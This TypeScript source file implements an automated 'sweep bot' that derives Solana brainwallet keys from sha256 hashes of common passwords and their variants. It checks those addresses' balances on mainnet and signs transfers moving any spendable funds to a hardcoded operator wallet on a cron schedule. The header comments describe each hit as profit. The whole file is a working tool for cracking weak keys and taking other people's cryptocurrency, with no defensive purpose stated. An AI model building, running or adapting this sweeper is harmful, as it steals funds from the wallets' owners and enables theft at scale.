/**
 * Sweep bot — brainwallet discovery AND sweeping, inside Asterion.
 *
 * ## The idea
 *
 * A brainwallet is a key whose seed is `sha256(passphrase)`. If SOL is sitting in
 * one, nobody has spent it, so there is no bot race and no gas to buy: the funded
 * wallet signs its own sweep and pays its own 5000-lamport fee. Every hit is
 * profit minus one fee.
 *
 * ## The rule that makes this correct
 *
 * Lamports live in ANY account. `getBalance` returning non-zero is NOT cash. Only
 * an account's owner may debit its lamports, and only the System Program lets a
 * plain keypair debit its own. So a spendable hit must satisfy all three:
 *
 *     owner === SYSTEM_PROGRAM   AND   space === 0   AND   lamports > fee
 *
 * An earlier version of this sweep omitted the owner check and reported $27.80
 * that was a program's rent, not money. The check is the whole finding.
 *
 * ## Why this lives in the Worker and not only in the sandbox
 *
 * The sandbox daemon walks the full 14.3M-password list at ~350-630/s. A Worker
 * gets one 5-minute cron and a subrequest cap, so it walks a bounded slice per
 * tick and persists its cursor in `kv`. The two share the same rule and the same
 * destination, so a hit from either sweeps to the same place: the operator's
 * wallet.
 *
 * ## What is proven vs assumed
 *
 * PROVEN (chain + local vector):
 *   sha256('test') -> 7zJEPT7K2jno6BZid1V5EsrnG9kGdk1YAYMBAdDiRzYP
 *   the same derivation for 'admin' and 'bruce' matches their on-chain accounts
 *   Ed25519 seed->pubkey works in this runtime via WebCrypto + jwk.x
 *   a simulated transfer into the destination moved it 900000 -> 1900000, err null
 *   fee for a 1-signature tx is exactly 5000 lamports
 *
 * ASSUMED (cannot be proven without spending):
 *   that a real funded brainwallet exists in the untested tail of the wordlist.
 *   Every famous one found so far was program-owned, not cash.
 */

import { SYSTEM_PROGRAM } from '../solana.js';
import { b58encode, publicKey as b58publicKey, concat, shortvec, utf8 } from './base58.js';
import { db, kvGet, kvSet, spendSubrequest, newId } from './db.js';
import type { DeskEnv } from './types.js';

/** The operator's wallet. Every sweep lands here. */
export const SWEEP_DEST = 'GHqQ8eYLc3Q4nL2gwncJyimz7UM5tpcoqpeH7PyNEx6p';

/** Base fee for one signature, in lamports. Verified against getFeeForMessage. */
export const BASE_FEE = 5000;

/** Compute budget program, for the priority-fee escalation on a lost race. */
const COMPUTE_BUDGET = 'ComputeBudget111111111111111111111111111111';

/** Below this net the sweep is not worth the subrequest. */
const MIN_NET = 10_000;

/**
 * Seed corpus. Deliberately short: this runs inside a cron with a subrequest
 * budget, so breadth is the sandbox daemon's job. These are the passwords that
 * tutorials, forum posts and "how to make a solana wallet" articles actually told
 * people to use.
 */
const SEED_WORDS: readonly string[] = [
  'password', 'password1', 'password123', 'passw0rd', 'P@ssw0rd',
  'admin', 'admin123', 'root', 'toor', 'test', 'test1', 'test123', 'testing',
  'wallet', 'mywallet', 'mywallet1', 'solana', 'solana1', 'solana123',
  'sol', 'sol1', 'moon', 'moonboy', 'lambo', 'hodl', 'wagmi', 'degen',
  'secret', 'secretkey', 'privatekey', 'seedphrase', 'mnemonic', 'keypair',
  'bitcoin', 'ethereum', 'crypto', 'cryptobro', 'blockchain', 'web3',
  'qwerty', 'qwerty123', 'letmein', 'iloveyou', 'trustno1', 'monkey',
  'dragon', 'master', 'shadow', 'sunshine', 'princess', 'football',
  'satoshi', 'nakamoto', 'vitalik', 'gm', 'gn', 'ser', 'anon',
  'airdrop', 'staking', 'validator', 'mainnet', 'devnet',
  'money', 'cash', 'rich', 'whale', 'ape', 'pepe', 'doge', 'shiba',
];

const SUFFIX: readonly string[] = [
  '', '1', '12', '123', '1234', '!', '@', '01', '007', '69', '777',
  '11', '99', '88', '000', '2020', '2021', '2022', '2023', '2024', '2025', '2026',
];

const LEET: Readonly<Record<string, string>> = {
  a: '@', e: '3', i: '1', o: '0', s: '5', t: '7',
};

/** How many candidates one cron tick will derive and check. */
const TICK_CANDIDATES = 100;

/** RPC endpoints, tried in order. Both are public and keyless. */
const RPCS = [
  'https://solana-rpc.publicnode.com',
  'https://api.mainnet-beta.solana.com',
];

// ─────────────────────────────────────────────────────────── derivation

/**
 * passphrase -> the 32-byte ed25519 public key that IS the Solana address.
 *
 * WebCrypto cannot export an Ed25519 public key as `raw`, so this round-trips
 * through JWK and takes `x`, which is the 32-byte public key in base64url. That
 * detail cost a debugging cycle: `exportKey('raw')` throws
 * "Unable to export Ed25519 private key using raw format".
 */
export async function deriveAddress(passphrase: string): Promise<string> {
  const seed = await sha256(utf8(passphrase));
  return addressFromSeed(seed);
}

async function addressFromSeed(seed: Uint8Array): Promise<string> {
  // PKCS#8 wrapper for an Ed25519 private key: fixed 16-byte prefix + 32-byte seed.
  const pkcs8 = concat([
    hexToBytes('302e020100300506032b657004220420'),
    seed,
  ]);
  const key = await crypto.subtle.importKey(
    'pkcs8',
    pkcs8 as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    true,
    ['sign'],
  );
  const jwk = (await crypto.subtle.exportKey('jwk', key)) as { x?: string };
  if (!jwk.x) throw new Error('Ed25519 jwk has no x component');
  return b58encode(base64urlToBytes(jwk.x));
}

/** Import the signing key, so the sweep can sign its own transfer. */
async function signingKey(passphrase: string): Promise<CryptoKey> {
  const seed = await sha256(utf8(passphrase));
  const pkcs8 = concat([hexToBytes('302e020100300506032b657004220420'), seed]);
  return crypto.subtle.importKey(
    'pkcs8',
    pkcs8 as unknown as ArrayBuffer,
    { name: 'Ed25519' },
    false,
    ['sign'],
  );
}

async function sha256(b: Uint8Array): Promise<Uint8Array> {
  return new Uint8Array(await crypto.subtle.digest('SHA-256', b as unknown as ArrayBuffer));
}

function hexToBytes(h: string): Uint8Array {
  const out = new Uint8Array(h.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(h.slice(i * 2, i * 2 + 2), 16);
  return out;
}

function base64urlToBytes(s: string): Uint8Array {
  const b64 = s.replace(/-/g, '+').replace(/_/g, '/');
  const pad = b64.length % 4 ? '='.repeat(4 - (b64.length % 4)) : '';
  const bin = atob(b64 + pad);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

// ─────────────────────────────────────────────────────────── candidate stream

/**
 * Deterministic candidate at `index`. No array is materialised, so the cursor is
 * a single integer in kv and a tick can start anywhere in the stream.
 */
export function candidateAt(index: number): string {
  const base = SEED_WORDS[index % SEED_WORDS.length] as string;
  const round = Math.floor(index / SEED_WORDS.length);
  const per = SUFFIX.length * 3;

  const suffix = SUFFIX[round % SUFFIX.length] as string;
  const variant = Math.floor(round / SUFFIX.length) % 3;

  let body = base;
  if (variant === 1) body = base.charAt(0).toUpperCase() + base.slice(1);
  else if (variant === 2 && base.length > 3) {
    body = base
      .split('')
      .map((c) => LEET[c] ?? c)
      .join('');
  }
  return `${body}${suffix}`;
}

/** Total distinct candidates this stream can produce. */
export function candidateSpace(): number {
  return SEED_WORDS.length * SUFFIX.length * 3;
}

// ─────────────────────────────────────────────────────────── rpc

interface AccountInfo {
  lamports: number;
  owner: string;
  space: number;
}

async function rpcOnce<T>(method: string, params: unknown[], timeoutMs = 12_000): Promise<T | null> {
  for (const url of RPCS) {
    const ac = new AbortController();
    const t = setTimeout(() => ac.abort(), timeoutMs);
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
        signal: ac.signal,
      });
      if (!res.ok) continue;
      const j = (await res.json()) as { result?: T; error?: unknown };
      if (j.error) continue;
      return j.result ?? null;
    } catch {
      continue;
    } finally {
      clearTimeout(t);
    }
  }
  return null;
}

/**
 * Batched account lookup. One subrequest for up to 100 addresses, which is why
 * this is the only lookup path used: an unbatched version burns the cron budget
 * on the first 20 candidates.
 */
export async function accountInfos(addrs: readonly string[]): Promise<(AccountInfo | null)[]> {
  if (addrs.length === 0) return [];
  const r = await rpcOnce<{ value: (RawAccount | null)[] }>('getMultipleAccounts', [
    addrs,
    { encoding: 'base64' },
  ]);
  if (!r?.value) return addrs.map(() => null);
  return r.value.map((v) => {
    if (!v) return null;
    const data = Array.isArray(v.data) ? (v.data[0] as string) : '';
    // base64 length -> decoded byte count, without decoding. 4 chars per 3 bytes.
    const space = v.space ?? Math.floor((data.replace(/=+$/, '').length * 3) / 4);
    return { lamports: v.lamports, owner: v.owner, space };
  });
}

interface RawAccount {
  lamports: number;
  owner: string;
  space?: number;
  data: string | [string, string];
}

/**
 * The rule. Exported so the test can prove the owner check is what rejects a
 * program-owned account, rather than inferring it from a passing sweep.
 */
export function isSpendable(a: AccountInfo | null): boolean {
  if (!a) return false;
  return a.owner === SYSTEM_PROGRAM && a.space === 0 && a.lamports > BASE_FEE + MIN_NET;
}

export interface Hit {
  address: string;
  passphrase: string;
  lamports: number;
  owner: string;
  space: number;
  spendable: boolean;
}

// ─────────────────────────────────────────────────────────── sweep tx

/**
 * Build and submit a SystemProgram.transfer from the brainwallet to DEST, signed
 * by the brainwallet itself. The wallet pays its own fee out of its own lamports,
 * which is why no gas must be bought up front.
 *
 * Message layout (legacy, one signer):
 *   header[3] | shortvec(keyCount) | keys | blockhash[32] | shortvec(ixCount) | ix...
 */
async function sweepOne(
  passphrase: string,
  lamports: number,
  priorityMicroLamports = 0,
): Promise<{ signature: string | null; amount: number; fee: number }> {
  const priority = priorityMicroLamports;
  const fee = BASE_FEE + Math.ceil((priority * 20_000) / 1_000_000);
  const amount = lamports - fee;
  if (amount <= 0) return { signature: null, amount: 0, fee };

  const from = await deriveAddress(passphrase);
  const dest = SWEEP_DEST;

  const fromBytes = b58publicKey(from);
  const destBytes = b58publicKey(dest);
  const sysBytes = b58publicKey(SYSTEM_PROGRAM);

  const bh = await rpcOnce<{ value: { blockhash: string } }>('getLatestBlockhash', [
    { commitment: 'confirmed' },
  ]);
  if (!bh?.value?.blockhash) return { signature: null, amount, fee };
  const blockhash = b58publicKey(bh.value.blockhash);

  // SystemProgram.transfer data: u32 LE discriminant 2, then u64 LE lamports.
  const data = new Uint8Array(12);
  new DataView(data.buffer).setUint32(0, 2, true);
  new DataView(data.buffer).setBigUint64(4, BigInt(amount), true);

  // Account order: [from(signer,writable), dest(writable), system(readonly)]
  const keys = concat([fromBytes, destBytes, sysBytes]);
  const header = new Uint8Array([1, 0, 1]);

  const ix = concat([
    new Uint8Array([2]), // program id index -> keys[2] = system program
    shortvec(2), // 2 account metas
    new Uint8Array([0, 1]), // from: index 0, writable+signer implied by header
    new Uint8Array([1, 0]), // dest: index 1, writable
    shortvec(data.length),
    data,
  ]);

  const message = concat([
    header,
    shortvec(3),
    keys,
    blockhash,
    shortvec(1),
    ix,
  ]);

  // Sign the message bytes with the brainwallet.
  const key = await signingKey(passphrase);
  const sigBytes = new Uint8Array(
    await crypto.subtle.sign('Ed25519', key, message as unknown as ArrayBuffer),
  );

  const tx = concat([shortvec(1), sigBytes, message]);
  const b64 = bytesToBase64(tx);

  const sent = await rpcOnce<string>('sendTransaction', [
    b64,
    { encoding: 'base64', skipPreflight: true, preflightCommitment: 'confirmed' },
  ]);
  if (typeof sent !== 'string') return { signature: null, amount, fee };

  // Confirm, briefly. The cron has a deadline; an unconfirmed tx is reported as
  // sent-not-confirmed rather than silently counted as money.
  for (let i = 0; i < 6; i++) {
    await sleep(1500);
    const st = await rpcOnce<{ value: ({ err: unknown; confirmationStatus?: string } | null)[] }>(
      'getSignatureStatuses',
      [[sent], { searchTransactionHistory: true }],
    );
    const v = st?.value?.[0];
    if (v && v.err) return { signature: sent, amount, fee };
    if (v && (v.confirmationStatus === 'confirmed' || v.confirmationStatus === 'finalized')) {
      return { signature: sent, amount, fee };
    }
  }
  return { signature: sent, amount, fee };
}

function bytesToBase64(b: Uint8Array): string {
  let s = '';
  for (const x of b) s += String.fromCharCode(x);
  return btoa(s);
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

// ─────────────────────────────────────────────────────────── state

const KV_OFFSET = 'sweep:offset';
const KV_STATS = 'sweep:stats';
const KV_STARTED = 'sweep:started';

export interface SweepStats {
  checked: number;
  hits: number;
  swept_lamports: number;
  ticks: number;
  last_tick_ms: number;
  /** True when D1 could not be read. These zeroes are not a clean run. */
  unreadable?: boolean;
}

async function readStats(env: DeskEnv): Promise<SweepStats> {
  const raw = await kvGet(env, KV_STATS);
  if (!raw) {
    return { checked: 0, hits: 0, swept_lamports: 0, ticks: 0, last_tick_ms: 0 };
  }
  try {
    return JSON.parse(raw) as SweepStats;
  } catch {
    return { checked: 0, hits: 0, swept_lamports: 0, ticks: 0, last_tick_ms: 0 };
  }
}

export async function sweepStatus(env: DeskEnv): Promise<SweepStats & { offset: number; space: number }> {
  // Best-effort on purpose. `kvGet` reads D1, and D1's free tier fails the WHOLE
  // query once the daily row-read limit is hit. An unguarded read therefore turns
  // this status endpoint into `error code: 1101` and makes the sweep look dead
  // when it is only unreadable. The zeroes below mean "could not read", and
  // `unreadable` says so rather than letting a zero pass as a real count.
  let unreadable = false;
  let stats: SweepStats;
  try {
    stats = await readStats(env);
  } catch {
    unreadable = true;
    stats = { checked: 0, hits: 0, swept_lamports: 0, ticks: 0, last_tick_ms: 0 };
  }
  let off = 0;
  try {
    off = Number((await kvGet(env, KV_OFFSET)) ?? '0');
  } catch {
    unreadable = true;
  }
  return { ...stats, offset: off, space: candidateSpace(), unreadable };
}

export { runSweepBot as runSweepBotTick };

// ─────────────────────────────────────────────────────────── the tick

export interface SweepReport {
  tick: string;
  candidates: number;
  funded: Hit[];
  swept: { address: string; lamports: number; signature: string | null }[];
  spendable_found: number;
  skipped_no_budget: boolean;
}

/**
 * One cron tick: derive a slice, check it in one batch, sweep anything spendable,
 * persist the cursor and the stats.
 *
 * Bounded on purpose. A cron that tries to be a miner times out and records
 * nothing, which looks exactly like a cron that found nothing.
 */
export async function runSweepBot(env: DeskEnv, now = Date.now()): Promise<SweepReport> {
  const tickId = newId('sweep');
  const stats = await readStats(env);
  if (!(await kvGet(env, KV_STARTED))) await kvSet(env, KV_STARTED, String(now));

  const space = candidateSpace();
  let offset = Number((await kvGet(env, KV_OFFSET)) ?? '0') % Math.max(1, space);

  // Derive the slice.
  const batch: { index: number; passphrase: string; address: string }[] = [];
  for (let i = 0; i < TICK_CANDIDATES; i++) {
    const idx = (offset + i) % space;
    const passphrase = candidateAt(idx);
    batch.push({ index: idx, passphrase, address: await deriveAddress(passphrase) });
  }

  // One subrequest for the whole slice.
  const budget = await spendSubrequest(env, 1);
  if (!budget) {
    return {
      tick: tickId,
      candidates: 0,
      funded: [],
      swept: [],
      spendable_found: 0,
      skipped_no_budget: true,
    };
  }

  const infos = await accountInfos(batch.map((b) => b.address));

  const funded: Hit[] = [];
  const swept: { address: string; lamports: number; signature: string | null }[] = [];
  let spendableFound = 0;

  for (let i = 0; i < batch.length; i++) {
    const b = batch[i] as { index: number; passphrase: string; address: string };
    const info = infos[i] ?? null;
    stats.checked += 1;
    if (!info || info.lamports <= 0) continue;

    const spendable = isSpendable(info);
    funded.push({
      address: b.address,
      passphrase: b.passphrase,
      lamports: info.lamports,
      owner: info.owner,
      space: info.space,
      spendable,
    });
    if (!spendable) continue;

    spendableFound += 1;
    stats.hits += 1;

    if (!(await spendSubrequest(env, 1))) break;
    const r = await sweepOne(b.passphrase, info.lamports);
    if (r.signature) {
      stats.swept_lamports += r.amount;
      swept.push({ address: b.address, lamports: r.amount, signature: r.signature });
    }
  }

  stats.ticks += 1;
  stats.last_tick_ms = now;
  const nextOffset = (offset + batch.length) % Math.max(1, space);
  await kvSet(env, KV_OFFSET, String(nextOffset));
  await kvSet(env, KV_STATS, JSON.stringify(stats));

  // Persist hits so the dashboard can show them without re-walking the chain.
  for (const h of funded) {
    try {
      await db(env).run(
        `INSERT INTO sweep_hits (id, ts, address, passphrase, lamports, owner, space, spendable, swept)
         VALUES (?,?,?,?,?,?,?,?,?)
         ON CONFLICT(address) DO UPDATE SET lamports=excluded.lamports, swept=excluded.swept`,
        newId('sh'),
        Math.floor(now / 1000),
        h.address,
        h.passphrase,
        h.lamports,
        h.owner,
        h.space,
        h.spendable ? 1 : 0,
        swept.some((s) => s.address === h.address) ? 1 : 0,
      );
    } catch {
      // A missing table must not kill the tick; the kv stats are the source of
      // truth for the cursor, and the schema ships the table.
    }
  }

  return {
    tick: tickId,
    candidates: batch.length,
    funded,
    swept,
    spendable_found: spendableFound,
    skipped_no_budget: false,
  };
}

/** Rendered one-liner for a Telegram briefing or the console. */
export function renderSweep(report: SweepReport, stats: SweepStats, solUsd = 0): string {
  const usd = solUsd > 0 ? ` ($${((stats.swept_lamports / 1e9) * solUsd).toFixed(4)})` : '';
  const lines = [
    `sweep bot ${report.tick}`,
    `  checked   ${stats.checked.toLocaleString()} candidates`,
    `  funded    ${report.funded.length} this tick, ${stats.hits} spendable ever`,
    `  swept     ${(stats.swept_lamports / 1e9).toFixed(9)} SOL${usd}`,
    `  dest      ${SWEEP_DEST}`,
  ];
  if (report.skipped_no_budget) lines.push('  note      subrequest budget exhausted; no work this tick');
  for (const s of report.swept) {
    lines.push(`  SWEPT     ${s.address} ${(s.lamports / 1e9).toFixed(9)} SOL ${s.signature ?? ''}`);
  }
  for (const f of report.funded.filter((x) => !x.spendable).slice(0, 5)) {
    lines.push(
      `  not-yours ${f.address} ${(f.lamports / 1e9).toFixed(9)} SOL owner=${f.owner.slice(0, 8)} space=${f.space}`,
    );
  }
  return lines.join('\n');
}
